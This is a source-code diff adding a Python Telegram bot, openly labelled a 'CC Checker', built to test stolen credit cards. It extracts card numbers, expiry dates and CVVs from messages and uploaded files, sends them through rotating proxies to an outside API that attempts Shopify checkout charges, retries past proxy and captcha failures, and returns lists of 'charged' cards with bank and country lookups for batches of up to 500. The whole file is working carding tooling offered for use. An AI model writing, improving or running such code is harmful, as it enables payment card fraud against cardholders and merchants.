@@ -1,0 +1,541 @@
+from config import CheckerConfig
+import asyncio
+import re
+import random
+import sys
+import aiohttp
+from curl_cffi.requests import AsyncSession
+from loguru import logger
+from telegram import Update, Document
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+import io
+
+# Setup logger
+def setup_logger(script_name: str = "CC BOT") -> None:
+    logger.remove()
+    logger.level("DEBUG", color="<blue>")
+    logger.level("INFO", color="<white>")
+    logger.level("SUCCESS", color="<green>")
+    logger.level("WARNING", color="<yellow>")
+    logger.level("ERROR", color="<red>")
+    logger.level("CRITICAL", color="<RED><bold>")
+
+    log_format = (
+        "<bold><cyan>[{extra[script]}]</cyan></bold> "
+        "- <dim>{time:YYYY-MM-DD HH:mm:ss}</dim> "
+        "- <magenta>{line}</magenta> "
+        "- <level>{message}</level>"
+    )
+    logger.configure(extra={"script": script_name})
+    logger.add(sys.stdout, level="DEBUG", colorize=True, format=log_format)
+
+setup_logger()
+config = CheckerConfig()
+
+# User settings storage (in-memory - resets on restart)
+# For persistent storage, use a database
+user_settings = {}
+
+def get_user_settings(user_id: int) -> dict:
+    """Get or create user settings"""
+    if user_id not in user_settings:
+        user_settings[user_id] = {
+            "proxy": None,
+            "products": [],
+            "email": None,
+            "is_shippable": False
+        }
+    return user_settings[user_id]
+
+def create_lista_(text: str):
+    """Extract credit card numbers from text"""
+    m = re.findall(
+        r'\d{15,16}(?:/|:|\|)\d+(?:/|:|\|)\d{2,4}(?:/|:|\|)\d{3,4}', text)
+    lis = list(filter(lambda num: num.startswith(
+        ("5", "6", "3", "4")), [*set(m)]))
+    return [xx.replace("/", "|").replace(":", "|") for xx in lis]
+
+
+async def auto_shopify_client(
+    card,
+    product_url,
+    email: str = None,
+    is_shippable: bool = False,
+    proxies: list = [],
+    max_retries: int = 4,
+    request_timeout: int =  45,
+    logger = None
+):
+    last_error = None
+    timeout = aiohttp.ClientTimeout(total=request_timeout)  # 45s timeout
+
+    async with aiohttp.ClientSession(timeout=timeout) as session:
+        for attempt in range(1, max_retries + 1):
+            try:
+                data = {
+                    "card": card,
+                    "product_url": product_url,
+                    "email": email,
+                    "is_shippable": is_shippable,
+                    "proxy": random.choice(proxies) if proxies else None,
+                }
+
+                async with session.post(
+                    "http://api.voidapi.xyz:8080/v2/shopify_graphql",
+                    json=data,
+                ) as response:
+
+                    result = await response.json()
+                    status = result.get("status")
+                    error = result.get("error")
+
+                    if result.get("success"):
+                        return result.get("data")
+
+                    # Debug info
+                    logger.info( f"[Attempt {attempt}/{max_retries}] status={status}, error={error}")
+
+                    # Retry conditions
+                    if error and any(err in error for err in (
+                        "ProxyError",
+                        "Failed to connect to proxy",
+                        "Failed to initialize checkout data",
+                        "Failed to perform, curl",
+                        'Failed to add to cart'
+                    )):
+                        last_error = {"error": error, "status": status}
+
+                    elif error and "captcha is required for this checkout" in error.lower():
+                        last_error = {
+                            "error": "Captcha triggered! Try again.", "status": status}
+
+                    else:
+                        # ✅ Non-retriable
+                        return result
+
+            except aiohttp.ClientError as e:
+                last_error = {"error": f"Client....",
+                              "status": "network_error"}
+                logger.warning(f"[Attempt {attempt}/{max_retries}] ClientError: {e}")
+
+            except asyncio.TimeoutError:
+                last_error = {
+                    "error": "TimeoutError: Request took too long", "status": "timeout"}
+                logger.warning(
+                    f"[Attempt {attempt}/{max_retries}] Request timed out after 45s")
+
+            except Exception as e:
+                last_error = {"error": str(e), "status": "exception"}
+                logger.warning(
+                    f"[Attempt {attempt}/{max_retries}] Unexpected error: {e}")
+
+            # Sleep before retrying
+            if attempt < max_retries:
+                await asyncio.sleep(0.3)
+
+    # If retries exhausted, return last known error
+    return last_error or {"status": "UnknownError", "error": "Unexpected error. Try again..."}
+
+
+sem = asyncio.Semaphore(config.CONCURRENCY_LIMIT)
+
+async def bin_lookup(bin_number: str):
+    """Lookup BIN information"""
+    try:
+        if bin_number.startswith(('4', '5', '3', '6')):
+            async with AsyncSession() as session:
+                url = f"https://api.voidapi.xyz/v2/bin_lookup/{bin_number[:6]}"
+                response = await session.get(url)
+                if response.status_code == 200:
+                    return response.json()
+                else:
+                    return {"error": f"Unexpected status code {response.status_code}", "status": "error"}
+        else:
+            return {"error": "Invalid bin number.", "status": "error"}
+    except Exception as e:
+        logger.error(f"BIN lookup error: {e}")
+        return {"error": str(e), "status": "error"}
+
+
+async def process_single_card(card: str, user_id: int = None) -> dict:
+    """Process a single card and return result"""
+    async with sem:
+        logger.info(f'Processing card: {card}')
+
+        # Get user settings or use defaults
+        settings = get_user_settings(user_id) if user_id else {}
+
+        # Use user's product URLs or fall back to config
+        user_products = settings.get("products", [])
+        if user_products:
+            product_url = random.choice(user_products)
+        else:
+            product_url = config._get_rnd_product_url()
+
+        # Use user's proxy or fall back to config
+        user_proxy = settings.get("proxy")
+        proxies = [user_proxy] if user_proxy else config.PROXY_LIST
+
+        response = await auto_shopify_client(
+            card=card,
+            product_url=product_url,
+            email=settings.get("email") or config.DEFAULT_EMAIL,
+            is_shippable=settings.get("is_shippable", config.IS_SHIPPABLE),
+            proxies=proxies,
+            logger=logger
+        )
+        bin_data = await bin_lookup(card[:6])
+        return {
+            "card": card,
+            "product_url": product_url,
+            "response": response,
+            "bin_data": bin_data
+        }
+
+
+def format_result(result: dict) -> str:
+    """Format check result for Telegram message"""
+    card = result["card"]
+    response = result["response"]
+    bin_data = result["bin_data"]
+
+    bin_info = ""
+    if bin_data.get("success"):
+        bd = bin_data.get("data", {})
+        bank = bd.get("bank", "Unknown")
+        emoji = bd.get("emoji", "")
+        country = bd.get("country", "Unknown")
+        level = bd.get("level", "Unknown")
+        bin_info = f"\n🏦 *Bank*: {bank}\n💳 *Level*: {level}\n🌍 *Country*: {country} {emoji}"
+
+    if response.get('success'):
+        msg = response.get("message", "Charged")
+        return f"✅ *CHARGED*\n\n💳 `{card}`\n📝 *Status*: {msg}{bin_info}"
+    else:
+        error = response.get("error", "Unknown error")
+        if '3ds' in error.lower():
+            return f"🔐 *3DS REQUIRED*\n\n💳 `{card}`\n📝 *Status*: {error}{bin_info}"
+        else:
+            return f"❌ *DECLINED*\n\n💳 `{card}`\n📝 *Error*: {error}{bin_info}"
+
+
+# Telegram Bot Handlers
+async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /start command"""
+    welcome_msg = (
+        "🔥 *CC Checker Bot*\n\n"
+        "*Setup Commands:*\n"
+        "`/setproxy host:port:user:pass` - Set your proxy\n"
+        "`/addproduct <url>` - Add product URL\n"
+        "`/products` - View your product list\n"
+        "`/clearproducts` - Clear all products\n"
+        "`/settings` - View your current settings\n\n"
+        "*Checking Commands:*\n"
+        "`/chk <card>` - Check single card\n"
+        "📎 *Send .txt file* - Mass check cards from file\n\n"
+        "*Card Format:*\n"
+        "`4111111111111111|12|2025|123`"
+    )
+    await update.message.reply_text(welcome_msg, parse_mode="Markdown")
+
+
+async def setproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /setproxy command"""
+    user_id = update.effective_user.id
+
+    if not context.args:
+        await update.message.reply_text(
+            "❌ Usage: `/setproxy host:port:user:pass`\n"
+            "Example: `/setproxy proxy.example.com:8080:username:password`\n\n"
+            "To remove proxy: `/setproxy clear`",
+            parse_mode="Markdown"
+        )
+        return
+
+    proxy_str = context.args[0]
+    settings = get_user_settings(user_id)
+
+    if proxy_str.lower() == "clear":
+        settings["proxy"] = None
+        await update.message.reply_text("✅ Proxy cleared! Using default proxy.")
+    else:
+        settings["proxy"] = proxy_str
+        await update.message.reply_text(f"✅ Proxy set to: `{proxy_str}`", parse_mode="Markdown")
+
+
+async def addproduct_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /addproduct command"""
+    user_id = update.effective_user.id
+
+    if not context.args:
+        await update.message.reply_text(
+            "❌ Usage: `/addproduct <shopify_product_url>`\n"
+            "Example: `/addproduct https://store.com/products/item`",
+            parse_mode="Markdown"
+        )
+        return
+
+    url = context.args[0]
+    settings = get_user_settings(user_id)
+
+    if url not in settings["products"]:
+        settings["products"].append(url)
+        await update.message.reply_text(
+            f"✅ Product added!\n\n"
+            f"📦 Total products: {len(settings['products'])}",
+            parse_mode="Markdown"
+        )
+    else:
+        await update.message.reply_text("⚠️ This product URL is already in your list.")
+
+
+async def products_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /products command - list all products"""
+    user_id = update.effective_user.id
+    settings = get_user_settings(user_id)
+
+    if not settings["products"]:
+        await update.message.reply_text(
+            "📦 *Your Product List*\n\n"
+            "No products set. Using default product.\n\n"
+            "Add products with: `/addproduct <url>`",
+            parse_mode="Markdown"
+        )
+        return
+
+    products_text = "\n".join([f"{i+1}. `{url}`" for i, url in enumerate(settings["products"])])
+    await update.message.reply_text(
+        f"📦 *Your Product List*\n\n{products_text}",
+        parse_mode="Markdown"
+    )
+
+
+async def clearproducts_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /clearproducts command"""
+    user_id = update.effective_user.id
+    settings = get_user_settings(user_id)
+    settings["products"] = []
+    await update.message.reply_text("✅ All products cleared! Using default product.")
+
+
+async def settings_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /settings command"""
+    user_id = update.effective_user.id
+    settings = get_user_settings(user_id)
+
+    proxy_status = f"`{settings['proxy']}`" if settings["proxy"] else "Default"
+    products_count = len(settings["products"])
+
+    msg = (
+        "⚙️ *Your Settings*\n\n"
+        f"🌐 *Proxy*: {proxy_status}\n"
+        f"📦 *Products*: {products_count} URLs\n"
+    )
+    await update.message.reply_text(msg, parse_mode="Markdown")
+
+
+async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /chk command for single card"""
+    user_id = update.effective_user.id
+
+    if not context.args:
+        await update.message.reply_text("❌ Usage: `/chk 4111111111111111|12|2025|123`", parse_mode="Markdown")
+        return
+
+    card_text = " ".join(context.args)
+    cards = create_lista_(card_text)
+
+    if not cards:
+        await update.message.reply_text("❌ No valid card found in your message.")
+        return
+
+    card = cards[0]
+    status_msg = await update.message.reply_text(f"⏳ Checking `{card}`...", parse_mode="Markdown")
+
+    try:
+        result = await process_single_card(card, user_id)
+        formatted = format_result(result)
+        await status_msg.edit_text(formatted, parse_mode="Markdown")
+    except Exception as e:
+        logger.error(f"Check error: {e}")
+        await status_msg.edit_text(f"❌ Error: {str(e)}")
+
+
+async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle .txt file uploads for mass checking"""
+    user_id = update.effective_user.id
+    document = update.message.document
+
+    if not document.file_name.endswith('.txt'):
+        await update.message.reply_text("❌ Please send a .txt file containing cards.")
+        return
+
+    # Download file
+    file = await context.bot.get_file(document.file_id)
+    file_bytes = await file.download_as_bytearray()
+
+    try:
+        card_text = file_bytes.decode('utf-8')
+    except UnicodeDecodeError:
+        card_text = file_bytes.decode('latin-1')
+
+    cards = create_lista_(card_text)
+
+    if not cards:
+        await update.message.reply_text("❌ No valid cards found in the file.")
+        return
+
+    max_cards = 500
+    if len(cards) > max_cards:
+        cards = cards[:max_cards]
+        await update.message.reply_text(f"⚠️ Limited to {max_cards} cards.")
+
+    status_msg = await update.message.reply_text(
+        f"📂 *File Received*\n\n"
+        f"💳 Cards found: {len(cards)}\n"
+        f"⏳ Starting check...",
+        parse_mode="Markdown"
+    )
+
+    charged = []
+    declined = []
+    three_ds = []
+
+    tasks = [process_single_card(card, user_id) for card in cards]
+
+    for i, future in enumerate(asyncio.as_completed(tasks)):
+        try:
+            result = await future
+            response = result["response"]
+
+            if response.get("success"):
+                charged.append(result)
+                # Send charged card immediately
+                await update.message.reply_text(format_result(result), parse_mode="Markdown")
+            elif '3ds' in str(response.get("error", "")).lower():
+                three_ds.append(result)
+                # Send 3DS cards too
+                await update.message.reply_text(format_result(result), parse_mode="Markdown")
+            else:
+                declined.append(result)
+
+            # Update progress every 10 cards
+            if (i + 1) % 10 == 0 or i + 1 == len(cards):
+                try:
+                    await status_msg.edit_text(
+                        f"⏳ *Progress*: {i + 1}/{len(cards)}\n\n"
+                        f"✅ Charged: {len(charged)}\n"
+                        f"🔐 3DS: {len(three_ds)}\n"
+                        f"❌ Declined: {len(declined)}",
+                        parse_mode="Markdown"
+                    )
+                except Exception:
+                    pass  # Ignore edit errors
+
+        except Exception as e:
+            logger.error(f"Mass check error: {e}")
+
+    # Final summary
+    summary = (
+        f"📊 *FINAL RESULTS*\n\n"
+        f"✅ Charged: {len(charged)}\n"
+        f"🔐 3DS: {len(three_ds)}\n"
+        f"❌ Declined: {len(declined)}\n"
+        f"📝 Total: {len(cards)}"
+    )
+    await status_msg.edit_text(summary, parse_mode="Markdown")
+
+    # Send charged cards as a file if many
+    if len(charged) > 5:
+        charged_text = "\n".join([r["card"] for r in charged])
+        file_buffer = io.BytesIO(charged_text.encode('utf-8'))
+        file_buffer.name = "charged_cards.txt"
+        await update.message.reply_document(
+            document=file_buffer,
+            caption=f"✅ {len(charged)} Charged Cards"
+        )
+
+
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle direct card messages"""
+    user_id = update.effective_user.id
+    text = update.message.text or ""
+    cards = create_lista_(text)
+
+    if not cards:
+        return  # Ignore messages without cards
+
+    if len(cards) == 1:
+        # Single card - check it
+        card = cards[0]
+        status_msg = await update.message.reply_text(f"⏳ Checking `{card}`...", parse_mode="Markdown")
+        try:
+            result = await process_single_card(card, user_id)
+            formatted = format_result(result)
+            await status_msg.edit_text(formatted, parse_mode="Markdown")
+        except Exception as e:
+            logger.error(f"Check error: {e}")
+            await status_msg.edit_text(f"❌ Error: {str(e)}")
+    else:
+        # Multiple cards - process them all
+        if len(cards) > 50:
+            cards = cards[:50]
+
+        status_msg = await update.message.reply_text(f"⏳ Checking {len(cards)} cards...")
+
+        charged = []
+        declined = []
+
+        tasks = [process_single_card(card, user_id) for card in cards]
+
+        for i, future in enumerate(asyncio.as_completed(tasks)):
+            try:
+                result = await future
+                if result["response"].get("success"):
+                    charged.append(result)
+                    await update.message.reply_text(format_result(result), parse_mode="Markdown")
+                else:
+                    declined.append(result)
+
+                if (i + 1) % 5 == 0 or i + 1 == len(cards):
+                    try:
+                        await status_msg.edit_text(
+                            f"⏳ Progress: {i + 1}/{len(cards)}\n✅ Charged: {len(charged)}\n❌ Declined: {len(declined)}"
+                        )
+                    except Exception:
+                        pass
+            except Exception as e:
+                logger.error(f"Mass check error: {e}")
+
+        summary = f"📊 *Results*\n\n✅ Charged: {len(charged)}\n❌ Declined: {len(declined)}\n📝 Total: {len(cards)}"
+        await status_msg.edit_text(summary, parse_mode="Markdown")
+
+
+def main():
+    """Start the bot"""
+    if not config.BOT_TOKEN:
+        logger.error("BOT_TOKEN not set! Please set the BOT_TOKEN environment variable.")
+        return
+
+    logger.info("Starting CC Checker Bot...")
+
+    app = Application.builder().token(config.BOT_TOKEN).build()
+
+    # Add handlers
+    app.add_handler(CommandHandler("start", start_command))
+    app.add_handler(CommandHandler("setproxy", setproxy_command))
+    app.add_handler(CommandHandler("addproduct", addproduct_command))
+    app.add_handler(CommandHandler("products", products_command))
+    app.add_handler(CommandHandler("clearproducts", clearproducts_command))
+    app.add_handler(CommandHandler("settings", settings_command))
+    app.add_handler(CommandHandler("chk", check_command))
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+
+    # Run the bot
+    logger.info("Bot is running...")
+    app.run_polling(allowed_updates=Update.ALL_TYPES)
+
+
+if __name__ == "__main__":
+    main()
